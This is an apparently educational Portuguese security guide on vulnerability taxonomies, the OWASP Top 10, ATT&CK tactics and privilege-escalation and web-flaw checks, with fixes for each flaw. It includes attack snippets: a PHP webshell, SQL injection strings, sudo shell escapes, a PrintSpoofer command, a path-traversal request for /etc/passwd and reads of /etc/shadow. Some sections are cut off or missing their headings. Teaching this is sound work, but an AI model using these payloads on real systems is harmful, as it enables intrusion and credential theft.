1 · Conceitos-chave — clique em cada card para detalhes
Vulnerabilidade — uma fraqueza que pode ser explorada. ⓘ detalhes
Uma vulnerabilidade é qualquer fraqueza em software, configuração, hardware ou processo que, se explorada, compromete a segurança (confidencialidade, integridade ou disponibilidade). Pode nascer de erro de programação (ex.: falta de validação de entrada), de configuração (ex.: permissão errada no /etc/shadow) ou de projeto.

Exemplo: um login que concatena a senha direto na query SQL tem uma vulnerabilidade de SQL Injection. Importante: existir a fraqueza não significa que já houve ataque — significa que o ataque é possível.
Ameaça (threat) — quem ou o que pode explorar a falha. ⓘ detalhes
Uma ameaça é o agente ou evento capaz de explorar uma vulnerabilidade: um atacante externo, um funcionário mal-intencionado, um malware, ou até um evento acidental. O conjunto de ameaças relevantes é o threat model (modelagem de ameaças).

Relação: vulnerabilidade é a "porta aberta"; a ameaça é "quem tenta entrar". Sem ameaça, a vulnerabilidade continua existindo, mas o risco é menor.
Risco — probabilidade × impacto. ⓘ detalhes
O risco combina a probabilidade de uma ameaça explorar a vulnerabilidade com o impacto caso aconteça. É o que realmente importa para priorizar correções.

Fórmula mental: Risco ≈ Probabilidade × Impacto. Uma falha crítica (impacto alto) em um sistema isolado e sem atacantes (probabilidade baixa) pode ter risco menor que uma falha média num servidor exposto à internet. Ferramentas como EPSS (probabilidade) e KEV (exploração real) ajudam a estimar o risco, não só o CVSS.
Exploit — o código/técnica que usa a falha. ⓘ detalhes
Um exploit é o código ou a sequência de passos que tira proveito de uma vulnerabilidade para produzir um efeito (abrir shell, ler arquivo, elevar privilégio). Pode ser um script pronto (ex.: no Exploit-DB/Metasploit) ou uma técnica manual.

Exemplo: para a CWE-89 (SQLi), o exploit pode ser o payload admin'-- -. Para o PwnKit (CVE-2021-4034), é um programa em C. Diferença: a vulnerabilidade é a fraqueza; o exploit é a ferramenta que a aciona.
PoC — demonstração de que a falha é explorável. ⓘ detalhes
Uma Prova de Conceito (Proof of Concept) é uma demonstração mínima de que a vulnerabilidade realmente funciona — sem necessariamente causar dano. Serve para provar o problema ao time/cliente no relatório.

Exemplo: em vez de apagar o banco, a PoC de uma SQLi mostra apenas ' OR '1'='1 logando sem senha, ou exibe a versão do banco. Em pentest ético, usa-se a PoC como evidência, evitando impacto real.
0-day — falha sem patch/conhecimento público. ⓘ detalhes
Um 0-day (zero-day) é uma vulnerabilidade que ainda não tem correção disponível — o fornecedor teve "zero dias" para corrigir. Se um exploit para ela circula, é um 0-day exploit, extremamente perigoso porque não há patch para se defender.

Ciclo: 0-day → descoberta/divulgação → patch lançado → vira "n-day" (falha conhecida com correção). A maioria dos ataques reais usa n-days sem patch aplicado, não 0-days.
Payload — o que roda após a exploração. ⓘ detalhes
O payload é a "carga útil" — o que o atacante executa depois que o exploit abre caminho. Pode ser um shell reverso, um comando, um beacon de C2, ou um ransomware.

Exemplo: no upload de webshell, o payload é o arquivo <?php system($_GET['c']); ?>. O exploit é "conseguir subir o arquivo"; o payload é "o que o arquivo faz".
Superfície de ataque — todos os pontos expostos. ⓘ detalhes
A superfície de ataque é a soma de todos os pontos por onde um atacante pode tentar entrar ou extrair dados: portas abertas, endpoints web, formulários, parâmetros, APIs, serviços, contas, dependências.

Princípio de defesa: reduzir a superfície (desligar serviços e portas desnecessárias, fechar o firewall, remover software não usado) diminui as oportunidades de ataque. É o oposto de "deixar tudo ligado por via das dúvidas".
CVE — identificador único de uma falha pública. ⓘ detalhes
Uma CVE (Common Vulnerabilities and Exposures) é o identificador único e público de uma vulnerabilidade específica, no formato CVE-ANO-NÚMERO (ex.: CVE-2021-4034). É catalogada no NVD e permite que todos falem da "mesma" falha.

Analogia: a CVE é como o "RG" de uma vulnerabilidade específica num produto. Já a CWE é a "categoria" do erro. Uma CWE (tipo) pode gerar milhares de CVEs (casos).
CWE — tipo/categoria de fraqueza. ⓘ detalhes
Uma CWE (Common Weakness Enumeration) descreve o tipo de fraqueza — a causa-raiz por trás das CVEs (ex.: CWE-89 = SQL Injection, CWE-22 = Path Traversal). Mantida pela MITRE, é a base do "CWE Top 25".

Como usar: ao achar uma falha, identifique a CWE (o "porquê" aconteceu) para recomendar a correção certa na causa, não só no sintoma. Veja a lista completa na seção 3 desta aba.
2 · Padrões e taxonomias (como o mundo cataloga falhas)

clique em cada padrão para aprofundar

CVECommon Vulnerabilities and Exposuresⓘ

Identificador único por falha (ex.: CVE-2021-4034). Responde "qual" vulnerabilidade.

O CVE dá um nome único e público a cada vulnerabilidade específica de um produto, no formato CVE-ANO-NÚMERO. É gerido pela MITRE e publicado no NVD (National Vulnerability Database) do NIST.

Quem cria: organizações chamadas CNA (CVE Numbering Authorities) — fornecedores como Microsoft, Red Hat, e a própria MITRE — recebem autoridade para atribuir CVEs.

Ciclo de vida: descoberta → reserva do ID (status "RESERVED") → divulgação com detalhes → análise no NVD (ganha CVSS e mapeamento CWE).

Na prática: ao citar uma falha no relatório, use o CVE quando existir — todo mundo encontra a mesma informação. Nem toda falha tem CVE (ex.: uma config errada específica do cliente não recebe CVE).
CWECommon Weakness Enumerationⓘ

Tipo de fraqueza (ex.: CWE-89 SQLi). A causa-raiz por trás das CVEs.

O CWE cataloga os tipos de fraqueza de software/hardware — a causa-raiz. Mantido pela MITRE, tem mais de 900 entradas organizadas em hierarquia (categorias, classes, bases, variantes).

CVE × CWE: o CVE é o caso (uma falha específica num produto); o CWE é a classe do erro. Uma única CWE (ex.: CWE-79 XSS) está por trás de milhares de CVEs.

Por que importa: identificar a CWE aponta para a correção na causa (ex.: CWE-89 → use prepared statements) e não só no sintoma. É a base do "CWE Top 25" (seção 3).

Root Cause Mapping: a prática de ligar cada CVE à sua CWE correta — ajuda organizações a investir onde mais erram.
CVSSCommon Vulnerability Scoring Systemⓘ

Nota de gravidade 0–10 (FIRST). Responde "quão grave".

O CVSS é o padrão aberto para medir a gravidade técnica de uma falha, com nota de 0 a 10. É mantido pelo FIRST.org e usado pelo NVD.

Três grupos de métricas: Base (intrínsecas, fixas), Temporal/Threat (mudam com o tempo: existe exploit? patch?) e Ambiental (ajuste ao seu ambiente).

Faixas: 0.0 Nenhuma · 0.1–3.9 Baixa · 4.0–6.9 Média · 7.0–8.9 Alta · 9.0–10.0 Crítica.

Cuidado: CVSS mede gravidade, não risco — uma falha 9.8 num sistema isolado pode ter risco menor que uma 7.5 exposta e já explorada. Combine com EPSS e KEV. Use a aba 🧮 CVSS para calcular.
EPSSExploit Prediction Scoring Systemⓘ

Probabilidade (0–100%) de exploração em 30 dias.

O EPSS (também do FIRST) estima a probabilidade de uma CVE ser explorada nos próximos 30 dias, de 0 a 100%. Usa machine learning sobre dados reais (menções, exploits publicados, atividade observada).

Para que serve: o CVSS diz "quão grave"; o EPSS diz "quão provável". Muitas CVEs "críticas" nunca são exploradas — o EPSS ajuda a priorizar as que realmente têm chance.

Uso combinado: priorize o que é grave (CVSS alto) E provável (EPSS alto). É atualizado diariamente.
KEVKnown Exploited Vulnerabilities (CISA)ⓘ

CVEs comprovadamente exploradas no mundo real.

O catálogo KEV da CISA (agência de segurança dos EUA) lista CVEs com exploração ativa confirmada no mundo real — não é teoria, há ataques acontecendo.

Prioridade máxima: se uma CVE está no KEV, corrija imediatamente, independentemente da nota CVSS. Órgãos federais dos EUA são obrigados a corrigir KEV em prazos definidos.

Exemplo real: as falhas de sudo CVE-2025-32462/32463 entraram no KEV meses após o patch sair — mostrando quantos sistemas ficam expostos por não atualizar. É um dos melhores sinais de "corrija isto agora".
OWASPOpen Worldwide Application Security Projectⓘ

Comunidade e projetos de segurança de aplicações.

A OWASP é uma fundação sem fins lucrativos (desde 2001) dedicada à segurança de aplicações. Produz padrões, ferramentas e documentação abertos.

Projetos famosos: Top 10 (os maiores riscos web — seção 4), WSTG (Web Security Testing Guide, metodologia de teste), ASVS (padrão de verificação de segurança), Cheat Sheets, ZAP (scanner), Juice Shop (app vulnerável para treino).

Para o aluno: OWASP é a referência obrigatória do lado web — o Top 10 para conhecer os riscos e o WSTG para saber como testá-los.
ATT&CKAdversarial Tactics & Techniquesⓘ

Comportamento do atacante (táticas/técnicas). Responde "como agem".

O MITRE ATT&CK é uma base de conhecimento, baseada em observações reais, do comportamento dos atacantes — organizada em táticas (o "porquê", o objetivo) e técnicas (o "como").

Estrutura: 14 táticas na matriz Enterprise (seção 5), cada uma com dezenas de técnicas e sub-técnicas (ex.: T1574.009 = Unquoted Service Path). Há matrizes para Enterprise, Mobile, Cloud, Containers e ICS.

Usos: mapear detecções (o que eu consigo ver?), emular adversários (red team), comunicar TTPs de forma padronizada e achar lacunas de defesa (gap assessment).
CAPECCommon Attack Pattern Enumerationⓘ

Catálogo de padrões de ataque.

O CAPEC (também da MITRE) cataloga padrões de ataque — descrições de como atacantes exploram fraquezas. É o complemento do CWE pelo lado ofensivo.

CWE × CAPEC: o CWE descreve a fraqueza (o erro no código); o CAPEC descreve o ataque que abusa dela. Eles são ligados entre si.

Exemplo: CWE-89 (SQL Injection, a fraqueza) ↔ CAPEC-66 (SQL Injection, o padrão de ataque). Útil para modelagem de ameaças e para entender o "como" por trás de cada fraqueza.
🔗 Como se conectam: uma CWE (tipo de erro) gera uma CVE (falha específica), que recebe uma nota CVSS (gravidade), uma probabilidade EPSS (chance de exploração) e, se já está sendo explorada, entra no KEV. O comportamento do atacante é descrito pelo ATT&CK.

4 · OWASP Top 10 (2021) — riscos de aplicação web

clique em cada risco para aprofundar

A01
Broken Access Control ⓘ
controle de acesso quebrado — o risco nº 1 atual.
Ocorre quando a aplicação não verifica corretamente se o usuário tem permissão para o recurso/ação. Subiu de 5º para 1º em 2021.

Exemplos: IDOR (trocar ?id=123 e ver dados de outro), acessar /admin sem ser admin, forçar métodos HTTP, elevação de privilégio.

Correção: negar por padrão; validar autorização no servidor em toda requisição; não confiar em controles só no front-end.
A02
Cryptographic Failures ⓘ
falhas de criptografia (dados sensíveis expostos).
Antes chamado "Sensitive Data Exposure". É sobre proteção fraca ou ausente de dados sensíveis (senhas, cartões, dados pessoais).

Exemplos: tráfego sem HTTPS, senhas em MD5/SHA1 ou texto claro, algoritmos fracos, chaves fixas, sem criptografia em repouso.

Correção: TLS em tudo, hashes fortes com sal (bcrypt/argon2), algoritmos atuais (AES-GCM), gestão de chaves adequada, não armazenar o que não precisa.
A03
Injection ⓘ
injeção (SQLi, XSS, comandos).
A aplicação envia dados não confiáveis para um interpretador (SQL, SO, LDAP). Era o nº 1 histórico; caiu para 3º. Inclui XSS a partir de 2021.

Exemplos: SQL Injection (CWE-89), OS Command Injection (CWE-78), XSS (CWE-79). Veja a aba 🌐 Web para o detalhe de cada uma.

Correção: consultas parametrizadas, validação por lista de permissões, escaping conforme o contexto, APIs seguras em vez de concatenar comandos.
A04
Insecure Design ⓘ
design inseguro — categoria nova.
Categoria nova em 2021. Trata de falhas na concepção — o sistema foi mal projetado, não apenas mal implementado. Nenhuma correção de código conserta um design inseguro.

Exemplos: falta de limites de taxa, fluxos de recuperação de senha fracos por projeto, ausência de modelagem de ameaças.

Correção: threat modeling desde o início, padrões seguros de projeto, requisitos de segurança, histórias de abuso ("abuse cases").
A05
Security Misconfiguration ⓘ
configuração insegura.
Configurações padrão/inseguras em qualquer camada (servidor, framework, nuvem).

Exemplos: directory listing ligado, erros detalhados expostos, contas/senhas padrão, headers de segurança ausentes, serviços e portas desnecessárias, buckets de nuvem abertos.

Correção: hardening (baseline CIS), remover o que não se usa, headers de segurança, revisar configs de nuvem, processo repetível de configuração.
A06
Vulnerable and Outdated Components ⓘ
componentes desatualizados/vulneráveis.
Uso de bibliotecas, frameworks ou softwares com vulnerabilidades conhecidas (CVEs). Antes "Using Components with Known Vulnerabilities".

Exemplos: uma lib JS antiga com XSS conhecido, um CMS desatualizado, dependências transitivas vulneráveis.

Correção: inventário de dependências (SBOM), análise de composição de software (SCA), atualizar regularmente, remover libs não usadas, acompanhar avisos de segurança.
A07
Identification and Authentication Failures ⓘ
falhas de autenticação/identificação.
Antes "Broken Authentication". Falhas em confirmar a identidade e gerir a sessão.

Exemplos: senhas fracas permitidas, sem bloqueio contra força bruta, sessão previsível ou sem expiração, credential stuffing, MFA ausente.

Correção: MFA, política de senha forte, bloqueio/limite de tentativas, gestão segura de sessão (IDs aleatórios, expiração, HttpOnly/Secure).
A08
Software and Data Integrity Failures ⓘ
falhas de integridade (supply chain) — categoria nova.
Categoria nova em 2021. Confiar em código/dados sem verificar integridade — foco em ataques de cadeia de suprimentos (supply chain).

Exemplos: atualizações sem assinatura, pipelines CI/CD comprometidos, desserialização insegura (CWE-502), dependências de fontes não confiáveis.

Correção: assinaturas digitais, verificar integridade de updates e dependências, proteger o pipeline, não desserializar dados não confiáveis.
A09
Security Logging and Monitoring Failures ⓘ
falhas de registro e monitoramento.
Sem logs/alertas adequados, ataques passam despercebidos. Subiu do 10º (2017) para o 9º, via pesquisa da comunidade.

Exemplos: logins falhos não registrados, logs sem alerta, logs sem proteção, ausência de resposta a incidentes.

Correção: registrar eventos de segurança relevantes, centralizar e proteger logs, alertar em tempo real, ter plano de resposta a incidentes.
A10
Server-Side Request Forgery (SSRF) ⓘ
SSRF — categoria nova.
Categoria nova em 2021 (CWE-918), adicionada pela pesquisa da comunidade. O servidor é induzido a fazer requisições a destinos que o atacante escolhe.

Exemplo: um campo "URL da imagem" usado para fazer o servidor acessar http://169.254.169.254/ (metadados de nuvem) e vazar credenciais internas.

Correção: validar/normalizar URLs por lista de permissões, bloquear faixas internas, desabilitar redirecionamentos, segmentar a rede.
5 · MITRE ATT&CK — as 14 táticas (Enterprise)

As táticas respondem ao "porquê" de cada ação do atacante, em sequência lógica. Clique para aprofundar.

1. Reconnaissance — coletar informação sobre o alvo. ⓘ
O atacante reúne informações sobre o alvo antes de atacar: domínios, e-mails, funcionários, tecnologias, portas. Pode ser passivo (OSINT, sem tocar no alvo) ou ativo (scan).

Exemplos: coleta de e-mails no LinkedIn, varredura de portas, enumeração de subdomínios, busca em vazamentos.

Defesa: reduzir exposição pública, monitorar scans, limitar informação em metadados e páginas.
2. Resource Development — preparar infraestrutura/ferramentas. ⓘ
O atacante cria ou compra os recursos que vai usar: domínios, servidores de C2, contas falsas, malware, exploits.

Exemplos: registrar domínio parecido com o da vítima (typosquatting), comprar credenciais vazadas, preparar e-mails de phishing.

Defesa: threat intelligence para detectar infraestrutura maliciosa, monitorar domínios semelhantes ao seu.
3. Initial Access — obter o primeiro acesso. ⓘ
Como o atacante entra pela primeira vez no ambiente.

Exemplos: phishing, exploração de aplicação exposta (ex.: SQLi, upload), credenciais válidas vazadas, drive-by, serviço remoto exposto (RDP/SSH).

Defesa: MFA, patch de sistemas expostos, filtro de e-mail, reduzir superfície de ataque.
4. Execution — executar código malicioso. ⓘ
Rodar código do atacante no sistema comprometido.

Exemplos: PowerShell, scripts, macros do Office, interpretadores de comando, abuso de ferramentas nativas (living-off-the-land).

Defesa: allowlist de aplicações, restringir PowerShell/macros, EDR, monitorar execução anômala.
5. Persistence — manter o acesso entre reinícios. ⓘ
Garantir que o acesso sobreviva a reboots, logoffs e trocas de senha.

Exemplos: criar usuário, chave SSH authorized_keys, tarefa agendada/cron, serviço, chave de registro (Run), webshell.

Defesa: monitorar criação de contas/tarefas/serviços, baseline de autoruns, revisar persistência conhecida.
6. Privilege Escalation — ganhar privilégios mais altos. ⓘ
Passar de usuário comum para root/SYSTEM/admin. É o foco das abas Linux e Windows deste guia.

Exemplos: sudo mal configurado, SUID, kernel exploit, token abuse (SeImpersonate), serviços fracos.

Defesa: privilégio mínimo, patches, hardening, monitorar uso de privilégios sensíveis.
7. Defense Evasion — evitar detecção. ⓘ
Técnicas para não ser detectado ou bloqueado.

Exemplos: apagar logs, desabilitar antivírus/EDR, ofuscar código, mascarar processos, assinar malware, timestomping.

Defesa: logs centralizados e protegidos (fora do host), alertas para desativação de segurança, EDR resistente a adulteração.
8. Credential Access — roubar credenciais. ⓘ
Obter senhas, hashes e tokens para avançar.

Exemplos: dump de LSASS/SAM, ler /etc/shadow, keylogging, força bruta, credenciais em arquivos/histórico, Kerberoasting.

Defesa: proteger armazenamentos de credencial (Credential Guard), MFA, não guardar segredos em texto, rotacionar.
9. Discovery — mapear o ambiente interno. ⓘ
Depois de entrar, o atacante estuda o ambiente por dentro.

Exemplos: listar usuários/grupos, processos, rede, compartilhamentos, políticas de domínio (whoami, net, ip, enumeração AD).

Defesa: detectar enumeração anômala, segmentar rede, limitar visibilidade entre hosts.
10. Lateral Movement — mover-se para outros sistemas. ⓘ
Pular de um host comprometido para outros, em direção ao objetivo.

Exemplos: pass-the-hash, RDP/SSH com credenciais roubadas, PsExec, WMI, abuso de confiança entre sistemas.

Defesa: segmentação de rede, MFA interno, limitar contas de admin, detectar uso lateral de credenciais.
11. Collection — coletar dados de interesse. ⓘ
Reunir os dados-alvo antes de exfiltrar.

Exemplos: capturar arquivos, e-mails, banco de dados, screenshots, dados de navegador, áudio/tela.

Defesa: DLP, classificação de dados, monitorar acesso em massa a dados sensíveis.
12. Command and Control — comunicação com o C2. ⓘ
Canal entre o atacante e o sistema comprometido para enviar comandos e receber dados.

Exemplos: beacons HTTP/HTTPS, DNS tunneling, uso de serviços legítimos (Slack, GitHub) como C2, tráfego cifrado.

Defesa: inspeção de tráfego de saída, detecção de beaconing, bloqueio de domínios maliciosos, proxy.
13. Exfiltration — extrair os dados. ⓘ
Tirar os dados coletados do ambiente da vítima.

Exemplos: upload para nuvem do atacante, exfiltração pelo canal de C2, compressão/cifra antes de enviar, uso de serviços legítimos.

Defesa: DLP, limites de volume de saída, monitorar uploads anômalos, segmentar dados sensíveis.
14. Impact — destruir/alterar/indisponibilizar. ⓘ
O objetivo final de dano: afetar integridade ou disponibilidade.

Exemplos: ransomware (cifrar dados), destruição/limpeza de dados, defacement, negação de serviço (DoS), manipulação de dados.

Defesa: backups offline testados, plano de recuperação, imutabilidade, resposta a incidentes.
6 · Metodologia de assessment (as 5 fases)

Todos os padrões (PTES, OSSTMM, NIST SP 800-115) seguem a mesma forma. O PTES detalha em 7 fases; na prática, 5 estágios.

01
Reconhecimento
mapear a superfície: serviços, versões, endpoints.
02
Varredura
encontrar serviços e pontos fracos (scan/enum).
03
Exploração
usar as falhas para entrar ou causar impacto.
04
Pós-exploração
medir o alcance: privilégios, pivot, dados.
05
Relatório
evidências, severidade e recomendações.
📋 PTES (7 fases): Pré-engajamento → Coleta de inteligência → Modelagem de ameaças → Análise de vulnerabilidades → Exploração → Pós-exploração → Relatório.
7 · Priorização: além do CVSS
CVSSgravidade

Quão séria é a falha (0–10). Ponto de partida, mas não diz se está sendo explorada.

EPSSprobabilidade

Chance de exploração nos próximos 30 dias. Ajuda a priorizar o que corrigir já.

KEVexploração real

Se a CVE está no KEV da CISA, corrija imediatamente — já há ataques reais.

CVSS

Permissões frouxas em /etc/shadow ✓ achada no lab

Permissões · Exposição de credenciais · CWE-732
›
O que é

O /etc/shadow guarda os hashes das senhas de todos os usuários e só o root deveria lê-lo. Se estiver legível por "outros" (permissão 644), qualquer usuário local copia os hashes e os quebra offline com john/hashcat.

Como achar
ls -l /etc/shadow /etc/passwd /etc/gshadow   # conferir permissões
cat /etc/shadow                              # se um user comum lê = falha
# Seguro: shadow = 0000 ou 0640 root:shadow | Falho: -rw-r--r-- (644)
Quando usar: Logo no início, para checar se arquivos de credencial têm permissão errada.
🟢 Resultado seguro-rw-r----- (640) ou ---------- (000), dono root; o cat retorna Permission denied.
🔴 Resultado com vulnerabilidade-rw-r--r-- (644) e o cat exibe os hashes $6$... — qualquer usuário lê.
Como resolver
chmod 0000 /etc/shadow        # dono root sempre lê
chown root:root /etc/shadow
# depois, trocar TODAS as senhas (os hashes podem já ter vazado)

CVSS

Sudo mal configurado (NOPASSWD / binário perigoso)

Sudo · Escalonamento · CWE-250 / CWE-269
›
O que é

Regras de sudo que deixam um usuário rodar como root um programa capaz de abrir shell, ler/escrever arquivos ou carregar bibliotecas. Qualquer binário "shell-capable" (ex.: vim, find, awk, python, less, tar, nano) vira caminho direto para root. Também entram aqui NOPASSWD, LD_PRELOAD/env_keep e injeção por wildcard.

Como achar
sudo -l                 # o que posso rodar como root
# Exemplos de saída perigosa:
#   (ALL) NOPASSWD: /usr/bin/find   -> sudo find . -exec /bin/sh \; -quit
#   (ALL) /usr/bin/vim             -> sudo vim -c ':!/bin/sh'
#   env_keep += LD_PRELOAD          -> carregar .so malicioso
# Cruze cada binário em https://gtfobins.github.io
Quando usar: Sempre — é a primeira verificação de privilégio após obter um shell.
🟢 Resultado segurouser may not run sudo, ou apenas comandos específicos e inofensivos exigindo senha.
🔴 Resultado com vulnerabilidade(ALL) NOPASSWD: ALL, um binário do GTFOBins (find, vim, less, python) ou env_keep += LD_PRELOAD.
Como resolver

Aplicar privilégio mínimo no /etc/sudoers (via visudo): conceder apenas o comando exato necessário, evitar NOPASSWD e binários do GTFOBins, remover env_keep desnecessário e nunca usar wildcards em caminhos.

# manter SUID só nos binários padrão do sistema

›

Nunca usar * em comandos privilegiados; usar caminhos absolutos e ./ antes de globs (tar ... -- ./*), ou listar arquivos explicitamente. Garantir que a pasta de trabalho não seja gravável por usuários.

O que é

Política que faz qualquer pacote .msi ser instalado com privilégio de SYSTEM. Se estiver habilitada (valor 1) em HKLM e HKCU, um usuário comum cria um MSI malicioso e ganha SYSTEM.

Como achar
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# ambos = 0x1  -> vulnerável
Quando usar: Checagem rápida de duas chaves de registro.
🟢 Resultado seguroChave ausente ou 0x0 em HKLM e/ou HKCU.
🔴 Resultado com vulnerabilidade0x1 em HKLM e HKCU — qualquer MSI instala como SYSTEM.
Como resolver

Desabilitar a política (valor 0) em HKLM e HKCU via GPO. Nunca habilitar AlwaysInstallElevated em ambiente de produção.

8.8
CVSS

Privilégios de token (SeImpersonate → Potato)

Tokens · Service account → SYSTEM · CWE-269
›
O que é

Contas de serviço (IIS, MSSQL) costumam ter SeImpersonatePrivilege ou SeAssignPrimaryTokenPrivilege. Ferramentas da família "Potato" (PrintSpoofer, GodPotato, RoguePotato) abusam disso para roubar um token de SYSTEM e virar SYSTEM. Privilégios como SeDebug, SeBackup/SeRestore também levam a root.

Como achar
whoami /priv       # procurar SeImpersonate / SeAssignPrimaryToken = Enabled
whoami /groups     # integridade e grupos
# exploração: PrintSpoofer.exe -i -c cmd  /  GodPotato
Quando usar: Em shell de conta de serviço (IIS, MSSQL).
🟢 Resultado segurowhoami /priv sem SeImpersonate/SeAssignPrimaryToken habilitados.
🔴 Resultado com vulnerabilidadeSeImpersonatePrivilege ... Enabled → PrintSpoofer/GodPotato → SYSTEM.
Como resolver

Conceder esses privilégios só a contas que realmente precisam; isolar contas de serviço, usar gMSA, e manter o sistema atualizado (muitas técnicas Potato dependem de componentes exploráveis).

7.3
CVSS

DLL · Hijack Execution Flow · ATT&CK T1574
›
O que é

Um serviço ou programa privilegiado carrega uma DLL pelo nome, sem caminho completo. Se existe uma pasta gravável antes na ordem de busca (ou no PATH), o atacante coloca uma DLL maliciosa com aquele nome e ela é carregada com o privilégio do processo.

Como achar
echo %PATH%                               # há pasta gravável?
icacls "C:\pasta\no\path"                  # checar (M)/(W) para Users
# ProcMon para ver DLLs "NAME NOT FOUND"; winPEAS aponta pastas graváveis
Quando usar: Quando um processo privilegiado carrega DLL pelo nome.
🟢 Resultado seguroPATH sem pastas graváveis; DLLs carregadas por caminho absoluto.
🔴 Resultado com vulnerabilidadePasta gravável no PATH, ou ProcMon mostra DLL NAME NOT FOUND em local gravável.
Como resolver

Remover pastas graváveis do PATH, corrigir ACLs, e fazer os aplicativos carregarem DLLs por caminho absoluto / com assinatura.

CVSS

SQL Injection

Injeção · OWASP A03 · CWE-89
›
O que é

A aplicação concatena entrada do usuário direto na query SQL. O atacante injeta aspas e comandos, burlando login, lendo/alterando o banco inteiro e, às vezes, lendo arquivos ou executando comandos no servidor.

Como achar
# no código:

# automatizado:  sqlmap -u "http://alvo/item.php?id=1" --batch --dbs
Quando usar: Em campos de login/busca e parâmetros que tocam o banco.
🟢 Resultado seguroErro tratado / login falha normalmente; código usa prepared statements.

›
O que é

O formulário de upload aceita qualquer extensão e salva numa pasta que executa PHP. O atacante envia um .php e acessa a URL dele, ganhando execução remota de comandos (RCE).

7.5
CVSS

Path Traversal / LFI / RFI

Arquivos · OWASP A01/A03 · CWE-22 / CWE-98
›
O que é

Um parâmetro vira caminho de arquivo sem sanitização. Com ../ o atacante sobe de diretório e lê arquivos do sistema (LFI/Traversal). Se o arquivo for incluído e permitir URL remota, vira RFI → execução de código.

Como achar
# no código:  grep -rniE "include|require|fopen|readfile|file_get_contents" /var/www/html/
# teste:  curl "http://alvo/download.php?file=../../../../etc/passwd"
Quando usar: Em parâmetros que referenciam arquivos (file=, page=).
🟢 Resultado seguroErro / só abre arquivos permitidos; realpath() valida o caminho.
🔴 Resultado com vulnerabilidade?file=../../../../etc/passwd retorna o conteúdo do arquivo do sistema.
Como resolver

Nunca usar entrada como caminho; usar lista de permissões, basename() e validar com realpath() garantindo que fique dentro da pasta esperada. Desativar allow_url_include.

XSS · OWASP A03 · CWE-79
›
O que é

A aplicação devolve entrada do usuário no HTML sem tratar. O atacante injeta JavaScript que roda no navegador da vítima — roubando sessão (cookies), fazendo ações no lugar dela ou desfigurando a página. Pode ser refletido (via link) ou armazenado (salvo no banco, atinge todos).

Como achar

Quando usar: Em campos refletidos na página ou armazenados no banco.

Injeção · RCE · OWASP A03 · CWE-78
›
O que é

A aplicação passa entrada do usuário para um comando do sistema (ex.: ping). Com ;, | ou $() o atacante anexa comandos próprios, executando-os com o usuário do servidor web.

Como achar

›
O que é

Em ambientes reais (e em qualquer cenário de Enterprise Security), sistemas, IPs e ferramentas mudam — o que permanece são os princípios de hardening: reduzir superfície, impor menor privilégio, cifrar comunicações, monitorar eventos e manter os serviços funcionando.
1 · Conceitos-chave de defesa corporativa — clique em cada card para aprofundar
Hardening — reduzir fraquezas de sistemas, serviços e redes. ⓘ detalhes
Hardening é o processo sistemático de configurar um sistema operacional, servidor ou ativo de rede de forma segura, eliminando padrões inseguros ("defaults"), desativando recursos desnecessários e aplicando controles técnicos (políticas de senha, firewall, TLS, controle de acesso).

Regra de ouro: um sistema recém-instalado é otimizado para funcionar rápido, não para resistir a ataques. Hardening transforma o padrão "aberto" em um baseline defensivo sem derrubar o serviço legítimo.
Menor Privilégio — dar só a permissão estritamente necessária. ⓘ detalhes
Todo usuário, serviço ou processo deve rodar com o mínimo de permissões necessárias para cumprir sua função — e pelo menor tempo possível.

Na prática: servidor web rodando como apache/www-data (nunca root), conta de banco só com permissão no schema da aplicação, SSH sem login de root, usuários comuns sem NOPASSWD: ALL no sudo e administradores usando contas dedicadas no AD. Se um serviço for invadido, o estrago fica contido.
Defesa em Profundidade — múltiplas camadas independentes de proteção. ⓘ detalhes
Nunca confie em um único controle de segurança. A Defesa em Profundidade empilha barreiras complementares: se o atacante passar pelo firewall de perímetro, encontra segmentação de DMZ; se explorar uma aplicação, esbarra em usuário não-root e SELinux; se tentar movimentação lateral, encontra SMB Signing, firewall de host e logs centralizados que disparam alerta.

Mentalidade: uma camada falhar é possível; todas falharem ao mesmo tempo é extremamente difícil.
Zero Trust — nunca confiar implicitamente; verificar sempre. ⓘ detalhes
O modelo clássico confiava em tudo que estivesse "dentro da rede interna". O Zero Trust parte da premissa de que a rede pode já estar comprometida: cada acesso exige autenticação forte, autorização explícita, criptografia em trânsito (TLS/VPN) e segmentação mínima.

Exemplos práticos: exigir TLS até em serviços internos (FTPS/HTTPS/LDAPS), firewall ativo no host mesmo atrás do perímetro, certificados individuais por usuário na VPN e bloqueio de movimento lateral.
Superfície de Ataque — tudo que está exposto e pode ser atacado. ⓘ detalhes
Cada porta aberta, serviço rodando, protocolo antigo habilitado (SMBv1, TLS 1.0, FTP sem criptografia) ou conta ociosa amplia a superfície de ataque.

Como reduzir: audite o que está escutando (ss -tulpn / Get-NetTCPConnection), desligue serviços não usados (ex.: Print Spooler em servidor, servidores de teste), desative listagem de diretórios e oculte banners de versão. O serviço desligado não pode ser explorado.
DAC vs. MAC — permissões comuns vs. confinamento obrigatório. ⓘ detalhes
DAC (Discretionary Access Control) são as permissões tradicionais (chmod/chown, ACLs): o dono do arquivo decide quem acessa, e o root pode quase tudo.

MAC (Mandatory Access Control) — como SELinux (RHEL/CentOS/Rocky/Fedora) e AppArmor (Ubuntu/Debian) — impõe políticas centrais no kernel que confinam cada processo ao seu domínio. Mesmo que um invasor explore o Apache ou vsftpd, o SELinux bloqueia leitura de arquivos ou portas fora do contexto permitido.
AAA — quem é você, o que pode fazer e o que fez. ⓘ detalhes
Os três pilares do controle de acesso:
• Authentication (Autenticação): provar identidade (senha forte, chave SSH, certificado cliente, MFA).
• Authorization (Autorização): definir permissões (grupos, RBAC, GPO, sudoers, SELinux).
• Accounting / Auditing (Auditoria): registrar ações em logs íntegros e centralizados (rsyslog, auditd, Windows Event Log) com horário sincronizado (NTP).
PKI & CA — infraestrutura que garante identidade e criptografia. ⓘ detalhes
PKI (Public Key Infrastructure) usa criptografia assimétrica e certificados digitais X.509 para provar que um servidor ou usuário é realmente quem diz ser.

Peças-chave:
• CA (Certificate Authority): entidade confiável que assina certificados (ex.: OpenSSL CA ou Windows ADCS).
• CSR: pedido de assinatura contendo a chave pública e o nome/SAN do serviço.
• CRL / OCSP: listas/serviços para revogar certificados comprometidos antes do vencimento.
TLS, PFS & HSTS — proteger dados em trânsito contra interceptação. ⓘ detalhes
